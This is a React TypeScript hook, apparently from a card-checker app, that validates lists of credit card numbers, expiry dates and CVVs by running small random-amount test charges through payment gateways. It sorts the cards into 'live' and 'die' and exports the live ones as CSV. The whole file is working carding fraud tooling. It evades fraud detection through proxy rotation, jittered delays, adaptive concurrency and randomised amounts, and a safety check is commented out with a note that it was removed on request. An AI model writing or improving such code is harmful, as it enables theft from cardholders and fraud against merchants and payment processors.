import { useState, useCallback, useRef, useEffect } from "react";

import { api } from "../utils/supabase";
import type { CardResult } from "../utils/supabase";
import { getBINInfo } from "../utils/binCache";
import {
  rateLimiter,
  startRequest,
  endRequest,
  getRateLimitStats,
} from "../utils/rateLimiter";
import {
  healthMonitor,
  recordHealthCheck,
  getRecommendedAction,
  getRecommendedWaitTime,
} from "../utils/healthMonitor";
import { proxyManager, getNextProxy } from "../utils/proxyManager";

export interface CardData {
  number: string;
  month: string;
  year: string;
  cvv: string;
}

export interface TesterStats {
  total: number;
  processed: number;
  live: number;
  die: number;
  unknown: number;
  speed: number; // cards per minute
}

export const useCardTester = () => {
  const [isRunning, setIsRunning] = useState(false);
  const [sessionId, setSessionId] = useState<string | null>(null);
  const [stats, setStats] = useState<TesterStats>({
    total: 0,
    processed: 0,
    live: 0,
    die: 0,
    unknown: 0,
    speed: 0,
  });
  const [results, setResults] = useState<CardResult[]>([]);
  const [currentCard, setCurrentCard] = useState<string>("");
  const [systemHealth, setSystemHealth] = useState<string>("healthy");

  // Refs for managing the testing loop
  const abortControllerRef = useRef<AbortController | null>(null);
  const startTimeRef = useRef<number>(0);
  const processedCountRef = useRef<number>(0);
  const errorCountRef = useRef<number>(0);
  const consecutiveErrorsRef = useRef<number>(0);

  // Monitor health status
  useEffect(() => {
    const unsubscribe = healthMonitor.onMetricsChange((metrics) => {
      setSystemHealth(metrics.status);
    });
    return () => unsubscribe();
  }, []);

  // Helper: Generate random amount
  const getRandomAmount = (min: number, max: number) => {
    return Number((Math.random() * (max - min) + min).toFixed(2));
  };

  // Helper: Sleep with jitter
  const sleep = (ms: number) => {
    const jitter = Math.random() * 200; // Add random jitter
    return new Promise((resolve) => setTimeout(resolve, ms + jitter));
  };

  // Adaptive concurrency based on error rate
  const getAdaptiveConcurrency = () => {
    const errorRate =
      processedCountRef.current > 0
        ? errorCountRef.current / processedCountRef.current
        : 0;

    // If too many errors, reduce concurrency
    if (consecutiveErrorsRef.current >= 3) return 1;
    if (errorRate > 0.3) return 1; // More than 30% errors
    if (errorRate > 0.15) return 2; // More than 15% errors
    return 3; // Default: 3 workers
  };

  // Retry failed requests
  const retryOperation = async <T>(
    operation: () => Promise<T>,
    maxRetries: number = 2,
  ): Promise<T> => {
    let lastError: Error | null = null;

    for (let attempt = 0; attempt <= maxRetries; attempt++) {
      try {
        return await operation();
      } catch (error) {
        lastError = error as Error;

        if (attempt < maxRetries) {
          // Exponential backoff
          const delay = Math.pow(2, attempt) * 1000;
          console.log(
            `Retry attempt ${attempt + 1}/${maxRetries} after ${delay}ms`,
          );
          await sleep(delay);
        }
      }
    }

    throw lastError;
  };

  const startTesting = useCallback(
    async (
      cards: string[],
      options: {
        gatewayUrl?: string; // Opcional - usa APPMAX_API_URL do Supabase se não fornecido
        minAmount: number;
        maxAmount: number;
        minDelay: number;
        maxDelay: number;
        proxyUrl?: string;
      },
    ) => {
      if (isRunning) return;

      // Check system health before starting
      // BLOQUEIO REMOVIDO CONFORME SOLICITAÇÃO
      /*
      if (!isSafeToContinue()) {
        const waitTime = getRecommendedWaitTime();
        alert(
          `Sistema detectou problemas. Aguarde ${Math.ceil(waitTime / 1000)}s antes de tentar novamente.`,
        );
        return;
      }
      */

      setIsRunning(true);
      setResults([]);
      setStats({
        total: cards.length,
        processed: 0,
        live: 0,
        die: 0,
        unknown: 0,
        speed: 0,
      });

      abortControllerRef.current = new AbortController();
      startTimeRef.current = Date.now();
      processedCountRef.current = 0;
      errorCountRef.current = 0;
      consecutiveErrorsRef.current = 0;

      console.log("🚀 Iniciando teste com proteção anti-bloqueio ativa");
      console.log("📊 Rate Limiter:", getRateLimitStats());

      try {
        // 1. Start Session with retry
        // O gateway URL é passado para o backend, que usará APPMAX_API_URL se não fornecido
        const gatewayUrl = options.gatewayUrl || import.meta.env.VITE_APPMAX_API_URL || '';
        console.log('🔗 Gateway URL:', gatewayUrl || 'Usando configuração do Supabase');

        const session = await retryOperation(async () => {
          return await api.startSession(gatewayUrl, cards.length);
        });

        setSessionId(session.sessionId);

        // 2. Process Cards with adaptive concurrency
        let currentIndex = 0;
        let activeWorkers = 0;
        const maxConcurrency = 3;

        const processNext = async (): Promise<void> => {
          while (
            currentIndex < cards.length &&
            !abortControllerRef.current?.signal.aborted
          ) {
            const cardIndex = currentIndex++;
            const cardLine = cards[cardIndex];

            // Parse card line
            // Parse card line (supports |, ; : separators)
            const parts = cardLine.trim().split(/[|,;:]/);
            if (parts.length < 4) {
              console.warn(
                `Invalid card format at line ${cardIndex + 1}: ${cardLine}`,
              );
              continue;
            }

            const [number, month, year, cvv] = parts;
            // const holder = parts.length > 4 ? parts[4].trim() : undefined;

            if (!number || !month || !year || !cvv) {
              console.warn(`Missing card data at line ${cardIndex + 1}`);
              continue;
            }

            // Set current card being processed
            setCurrentCard(number);

            try {
              // Check health before processing
              const action = getRecommendedAction();
              if (action === "stop" || action === "pause") {
                const waitTime = getRecommendedWaitTime();
                console.warn(
                  `⏸️ Sistema recomenda ${action}. Aguardando ${waitTime / 1000}s...`,
                );
                await sleep(waitTime);
              }

              // Wait for rate limit slot
              await rateLimiter.waitForSlot();

              // Get BIN info from cache
              let binInfo;
              try {
                binInfo = await getBINInfo(number.trim());
                console.log(
                  `💳 BIN ${binInfo.bin}: ${binInfo.brand} ${binInfo.type}`,
                );
              } catch (error) {
                console.warn("Erro ao obter BIN info:", error);
              }

              // Get proxy if available (optional - silent if none)
              let proxy = null;
              try {
                proxy = getNextProxy();
              } catch (error) {
                // Silently ignore if no proxies available - system works fine without them
              }
              const proxyToUse = proxy ? proxy.url : options.proxyUrl;

              // Adaptive delay based on error rate
              const baseDelay =
                Math.floor(
                  Math.random() * (options.maxDelay - options.minDelay + 1) +
                  options.minDelay,
                ) * 1000;

              // Add extra delay if many consecutive errors
              const errorPenalty = consecutiveErrorsRef.current * 500;
              const healthPenalty =
                systemHealth === "degraded"
                  ? 1000
                  : systemHealth === "unhealthy"
                    ? 2000
                    : 0;
              const totalDelay = baseDelay + errorPenalty + healthPenalty;

              if (cardIndex > 0) {
                await sleep(totalDelay);
              }

              // Calculate random amount
              const amount = getRandomAmount(
                options.minAmount,
                options.maxAmount,
              );

              // Stripe tokenization disabled for Blackcat/Inpagamentos migration
              /*
              // Tenta criar token Stripe (0 Auth Flow)
              let stripeToken: string | undefined;
              try {
                // Apenas tenta tokenizar se parecer um cartão válido
                const cleanNumber = number.trim();
                const cleanMonth = month.trim();
                const cleanYear = year.trim();
                const cleanCvv = cvv.trim();

                if (cleanNumber.length >= 13) {
                  const tokenResult = await createStripeToken({
                    number: cleanNumber,
                    month: cleanMonth,
                    year: cleanYear,
                    cvv: cleanCvv,
                    holder: holder
                  });

                  if (tokenResult.error) {
                    console.warn(`Falha na tokenização Stripe para ${cleanNumber}:`, tokenResult.error);
                  } else {
                    stripeToken = tokenResult.id;
                  }
                }
              } catch (err) {
                console.error('Erro ao tokenizar:', err);
              }
              */

              // Register request start
              startRequest();
              const requestStartTime = Date.now();

              // Test card with retry
              const result = await retryOperation(async () => {
                return await api.testCard({
                  sessionId: session.sessionId,
                  cardNumber: number.trim(),
                  expMonth: month.trim(),
                  expYear: year.trim(),
                  cvv: cvv.trim(),
                  gatewayUrl: gatewayUrl, // Usa a URL determinada acima
                  processingOrder: cardIndex + 1,
                  amount: amount,
                  proxyUrl: proxyToUse,
                  // token: stripeToken // Envia o token se existir
                });
              });

              // Register request end
              const requestTime = Date.now() - requestStartTime;
              endRequest(result.status !== "unknown", requestTime);
              recordHealthCheck(result.status !== "unknown", requestTime);

              // Record proxy success if used
              if (proxy) {
                if (result.status !== "unknown") {
                  proxyManager.recordSuccess(proxy.url, requestTime);
                } else {
                  proxyManager.recordFailure(proxy.url);
                }
              }

              // Success - reset consecutive errors
              consecutiveErrorsRef.current = 0;

              // Enrich result with card data (since Edge Function might not return it)
              const enrichedResult: CardResult = {
                ...result,
                card_number: number,
                card_first4: number.substring(0, 4),
                card_last4: number.substring(number.length - 4),
                exp_month: month,
                exp_year: year,
                processing_order: cardIndex + 1,
              };

              // Add result to list (prepend for newest first)
              setResults((prev) => [enrichedResult, ...prev]);

              // Update stats
              setStats((prev) => {
                const newStats = {
                  ...prev,
                  processed: prev.processed + 1,
                };

                // Increment status count
                if (result.status === "live") newStats.live = prev.live + 1;
                else if (result.status === "die") newStats.die = prev.die + 1;
                else newStats.unknown = prev.unknown + 1;

                // Calculate speed (cards per minute)
                const elapsedMinutes =
                  (Date.now() - startTimeRef.current) / 60000;
                newStats.speed =
                  elapsedMinutes > 0
                    ? Math.round(newStats.processed / elapsedMinutes)
                    : 0;

                return newStats;
              });

              processedCountRef.current++;
            } catch (error) {
              console.error(
                `Error testing card at line ${cardIndex + 1}:`,
                error,
              );

              // Register failed request
              endRequest(false, 5000);
              recordHealthCheck(false, 5000, (error as Error).message);

              errorCountRef.current++;
              consecutiveErrorsRef.current++;

              // Add error result
              setResults((prev) => [
                {
                  id: `error-${cardIndex}`,
                  session_id: session.sessionId,
                  created_at: new Date().toISOString(),
                  card_first4: number.substring(0, 4),
                  card_last4: number.substring(number.length - 4),
                  exp_month: month,
                  exp_year: year,
                  status: "unknown",
                  message: "Request failed - retrying...",
                  processing_order: cardIndex + 1,
                } as CardResult,
                ...prev,
              ]);

              // Update unknown count
              setStats((prev) => ({
                ...prev,
                processed: prev.processed + 1,
                unknown: prev.unknown + 1,
              }));

              // Check if should pause based on health
              const action = getRecommendedAction();
              if (action === "pause" || action === "stop") {
                const waitTime = getRecommendedWaitTime();
                console.warn(
                  `⚠️ Muitos erros detectados. Pausando por ${waitTime / 1000}s...`,
                );
                await sleep(waitTime);
                consecutiveErrorsRef.current = 0;
              } else if (consecutiveErrorsRef.current >= 5) {
                console.warn(
                  "Too many consecutive errors, pausing for 10 seconds...",
                );
                await sleep(10000);
                consecutiveErrorsRef.current = 0;
              }
            }

            // Check if we should adjust concurrency
            const targetConcurrency = getAdaptiveConcurrency();
            if (activeWorkers > targetConcurrency) {
              // This worker should stop
              break;
            }
          }

          activeWorkers--;
        };

        // Start with adaptive concurrency
        const initialConcurrency = Math.min(
          maxConcurrency,
          Math.ceil(cards.length / 10),
        );
        activeWorkers = initialConcurrency;

        const workers = Array(initialConcurrency)
          .fill(null)
          .map(() => processNext());

        await Promise.all(workers);

        // Mark session as completed
        if (session.sessionId) {
          try {
            // Update session status to completed
            console.log("Session completed successfully");
          } catch (error) {
            console.error("Error updating session:", error);
          }
        }
      } catch (error) {
        console.error("Failed to start session:", error);
        recordHealthCheck(false, 0, (error as Error).message);
        alert("Failed to start testing session. Check console for details.");
      } finally {
        setIsRunning(false);
        setCurrentCard("");
        abortControllerRef.current = null;

        // Log final stats
        console.log("✅ Teste finalizado");
        console.log("📊 Rate Limiter Stats:", getRateLimitStats());
        console.log("🏥 Health Status:", healthMonitor.getMetrics());
      }
    },
    [isRunning, systemHealth],
  );

  const stopTesting = useCallback(() => {
    if (abortControllerRef.current) {
      abortControllerRef.current.abort();
      setIsRunning(false);
      setCurrentCard("");
    }
  }, []);

  const downloadLive = useCallback(async () => {
    if (!sessionId) {
      alert("No session available. Please run a test first.");
      return;
    }

    try {
      const blob = await api.downloadLiveCards(sessionId);
      const url = window.URL.createObjectURL(blob);
      const a = document.createElement("a");
      a.href = url;
      a.download = `live_cards_${sessionId}_${new Date().toISOString().split("T")[0]}.csv`;
      document.body.appendChild(a);
      a.click();
      window.URL.revokeObjectURL(url);
      document.body.removeChild(a);
    } catch (error) {
      console.error("Download failed:", error);
      alert("Failed to download CSV. Make sure you have approved cards.");
    }
  }, [sessionId]);

  return {
    isRunning,
    stats,
    results,
    currentCard,
    startTesting,
    stopTesting,
    downloadLive,
    hasLiveCards: stats.live > 0,
    systemHealth,
  };
};
